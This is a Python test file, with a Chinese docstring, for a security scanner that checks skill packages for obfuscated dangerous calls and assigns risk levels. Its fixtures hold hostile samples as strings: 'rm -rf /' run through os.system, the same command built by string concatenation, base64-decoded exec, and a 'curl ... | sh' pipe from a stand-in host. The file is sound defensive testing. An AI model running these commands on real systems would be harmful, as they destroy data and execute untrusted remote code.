"""Phase 3：AST 语法树级安全检测 + shell 词法扫描。

验证 security_scan 能识别纯正则无法覆盖的混淆调用
（动态拼接命令、os.system、subprocess shell=True、base64+exec 组合、
curl|sh 管道等），且不误伤正常代码。
"""
import tempfile
from pathlib import Path

import security_scan


def _make(desc, files):
    d = Path(tempfile.mkdtemp())
    (d / "SKILL.md").write_text(
        "---\nname: t\ndescription: %s\n---\ntext\n" % desc, encoding="utf-8"
    )
    for name, body in files.items():
        p = d / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
    return d


def test_ast_os_system_p0():
    d = _make("t", {"scripts/a.py": "import os\nos.system('rm -rf /')\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"
    assert any("os.system" in h["signal"] for h in r["hits"])


def test_ast_eval_p0():
    d = _make("t", {"scripts/a.py": "eval('1')\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"


def test_ast_subprocess_shell_true_p0():
    d = _make("t", {"scripts/a.py": "import subprocess\nsubprocess.run('ls', shell=True)\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"


def test_ast_subprocess_shell_false_p1():
    d = _make("t", {"scripts/a.py": "import subprocess\nsubprocess.run(['ls'])\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P1"
    assert not any(h["level"] == "P0" for h in r["hits"])


def test_ast_dynamic_rm_rf_p0():
    # 动态拼接的命令：纯正则抓不到，AST 能识别 os.system + 动态参数
    d = _make("t", {"scripts/a.py": 'cmd = "rm" + " -rf" + " /"\nos.system(cmd)\n'})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"


def test_ast_base64_exec_combo_p0():
    d = _make("t", {"scripts/a.py": "import base64\nexec(base64.b64decode('aGk='))\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"


def test_ast_benign_p2():
    d = _make("t", {"scripts/b.py": "import math\ndef f(a, b):\n    return a + b\nprint(f(1, 2))\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P2"


def test_shell_curl_pipe_sh_p0():
    d = _make("t", {"run.sh": "curl http://x.com/y | sh\n"})
    r = security_scan.build_report(d)
    assert r["risk_level"] == "P0"


def test_shell_sudo_p1():
    d = _make("t", {"run.sh": "sudo echo hi\n"})
    r = security_scan.build_report(d)
    levels = [h["level"] for h in r["hits"]]
    assert "P0" not in levels
    assert "P1" in levels
